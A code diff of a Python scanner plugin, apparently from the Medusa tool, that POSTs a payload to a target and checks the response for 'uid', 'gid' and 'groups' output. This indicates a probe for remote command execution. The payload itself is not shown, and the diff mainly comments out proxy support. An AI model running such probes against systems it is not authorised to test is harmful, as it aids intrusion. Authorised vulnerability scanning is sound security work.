@@ -2,7 +2,7 @@
 # _*_ coding: utf-8 _*_
 
 
-import urllib
+import urllib.parse
 import requests
 
 import logging
@@ -54,16 +54,16 @@ def medusa(Url,RandomAgent,ProxyIp):
         'Referer':payload_url,
         'Upgrade-Insecure-Requests': '1'
     }
-    s = requests.session()
     try:
-        if ProxyIp != None:
-            proxies = {
-                # "http": "http://" + str(ProxyIps) , # 使用代理前面一定要加http://或者https://
-                "http": "http://" + str(ProxyIp)
-            }
-            resp = s.post(payload_url, data=payload, headers=headers, proxies=proxies,timeout=5, verify=False)
-        elif ProxyIp == None:
-            resp = s.post(payload_url, data=payload,headers=headers, timeout=5, verify=False)
+        s = requests.session()
+        # if ProxyIp != None:
+        #     proxies = {
+        #         # "http": "http://" + str(ProxyIps) , # 使用代理前面一定要加http://或者https://
+        #         "http": "http://" + str(ProxyIp)
+        #     }
+        #     resp = s.post(payload_url, data=payload, headers=headers, proxies=proxies,timeout=5, verify=False)
+        # elif ProxyIp == None:
+        resp = s.post(payload_url, data=payload,headers=headers, timeout=5, verify=False)
         con = resp.text
         code = resp.status_code
         if code==200 and con.lower().find('uid')!=-1 and con.lower().find('gid')!=-1 and con.lower().find('groups')!=-1:
